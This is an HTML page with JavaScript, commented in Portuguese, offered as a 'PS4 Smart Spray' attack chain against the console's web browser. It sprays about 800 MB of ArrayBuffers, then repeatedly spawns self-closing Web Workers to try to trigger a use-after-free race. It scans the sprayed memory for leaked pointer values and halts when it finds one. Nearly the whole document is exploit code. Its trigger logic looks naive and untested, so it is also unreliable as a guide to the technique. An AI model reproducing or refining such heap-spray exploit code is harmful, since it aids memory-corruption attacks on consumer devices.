<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Smart Spray (Safe Mode)</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; font-size: 14px; }
        #status { font-weight: bold; color: yellow; margin: 10px 0; font-size: 18px;}
        .found { background: #ff00ff; color: #fff; font-size: 16px; border: 2px solid #fff; padding: 10px; }
        .bar-container { width: 100%; height: 30px; background: #333; border: 1px solid #555; }
        .bar { width: 0%; height: 100%; background: #00cc00; transition: width 0.2s; }
        .log { border-bottom: 1px solid #222; padding: 2px; color: #aaa; }
    </style>
</head>
<body>
    <h3>SMART HEAP SPRAY & LEAK HUNTER</h3>
    <div id="status">Status: Pronto.</div>
    
    <div class="bar-container">
        <div id="prog" class="bar"></div>
    </div>
    <div id="info">Memória: 0 MB / 800 MB (Meta)</div>
    
    <br>
    <button onclick="startSmartSpray()">INICIAR ATTACK CHAIN</button>
    <div id="console"></div>

    <script>
        var logElem = document.getElementById('console');
        function log(msg, type="") {
            var d = document.createElement('div');
            d.className = 'log ' + type;
            d.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            logElem.appendChild(d);
            // Mantém apenas as últimas 50 linhas para não travar o DOM
            if (logElem.childElementCount > 50) logElem.removeChild(logElem.firstChild);
        }

        // --- CONFIGURAÇÕES DE SEGURANÇA ---
        const TARGET_MB = 800; // Paramos em 800MB para evitar OOM
        const BLOCK_SIZE = 1024 * 1024; // 1MB por bloco
        
        var memoryBlocks = [];
        var allocatedMB = 0;
        var mode = "FILLING"; // Modos: FILLING, HUNTING

        // Worker para causar o UAF
        var workerBlob = new Blob([`
            self.onmessage = function() {
                // Tenta confundir o kernel ao fechar
                self.close();
            }
        `], {type: 'application/javascript'});
        var workerUrl = URL.createObjectURL(workerBlob);

        function startSmartSpray() {
            document.getElementById('status').innerText = "Status: FASE 1 - ENCHENDO MEMÓRIA...";
            log("Iniciando alocação segura até " + TARGET_MB + "MB...");

            let fillInterval = setInterval(() => {
                
                // --- SEGURANÇA: Se atingirmos a meta, paramos de alocar ---
                if (allocatedMB >= TARGET_MB) {
                    clearInterval(fillInterval);
                    mode = "HUNTING";
                    document.getElementById('status').innerText = "Status: FASE 2 - CAÇANDO LEAK (Memória Estável)";
                    document.getElementById('prog').style.background = "#ff9900"; // Muda cor para laranja
                    log("Memória cheia. Iniciando loop de ataque sem alocação...", "info");
                    
                    // Inicia o loop que só ataca e checa, sem alocar mais
                    startHuntingLoop();
                    return;
                }

                try {
                    // 1. ALOCAÇÃO
                    let buffer = new ArrayBuffer(BLOCK_SIZE);
                    let view = new Uint32Array(buffer);
                    view[0] = 0xDEADBEEF; // Marcador apenas para debug
                    
                    memoryBlocks.push(view);
                    allocatedMB++;

                    // Visual
                    let pct = (allocatedMB / TARGET_MB) * 100;
                    document.getElementById('prog').style.width = pct + "%";
                    document.getElementById('info').innerText = `Memória: ${allocatedMB} MB / ${TARGET_MB} MB`;

                } catch(e) {
                    clearInterval(fillInterval);
                    log("Erro de alocação prematuro (OOM). Passando para fase de caça.", "warn");
                    startHuntingLoop();
                }

            }, 10); // Aloca rápido (10ms)
        }

        // --- FASE 2: Apenas ataca e verifica (Sem crashar por OOM) ---
        function startHuntingLoop() {
            setInterval(() => {
                // 1. O GATILHO (Thread Race)
                // Disparamos vários workers para tentar corromper os blocos que JÁ possuímos
                for(let k=0; k<5; k++) {
                    let w = new Worker(workerUrl);
                    w.postMessage("die");
                }

                // 2. A VERIFICAÇÃO (Scan Rápido)
                // Checamos blocos aleatórios para não perder tempo verificando tudo sempre
                scanRandomBlocks();

            }, 50); // Loop de ataque a cada 50ms
        }

        function scanRandomBlocks() {
            // Verifica 20 blocos aleatórios por ciclo para ser leve
            for(let i=0; i<20; i++) {
                if (memoryBlocks.length === 0) return;
                
                // Escolhe um bloco aleatório que já alocamos
                let idx = Math.floor(Math.random() * memoryBlocks.length);
                let view = memoryBlocks[idx];

                // Verifica o início e alguns offsets comuns de struct
                // Se o valor mudar de 0 (ou undefined/marcador) para algo estranho...
                if (view[1] !== 0 || view[2] !== 0 || view[16] !== 0) {
                    
                    // Filtra o nosso próprio marcador
                    if (view[0] === 0xDEADBEEF && view[1] === 0) continue;

                    let hex = "0x" + view[1].toString(16).toUpperCase();
                    
                    // ACHAMOS!
                    log(`[!!!] LEAK DETECTADO no Bloco ${idx}!`, "found");
                    log(`Valor: ${hex}`, "found");
                    document.getElementById('status').innerText = "Status: LEAK ENCONTRADO!";
                    document.getElementById('status').style.color = "red";
                    
                    // Congela para você poder tirar foto/anotar
                    throw "STOP";
                }
            }
        }
    </script>
</body>
</html>
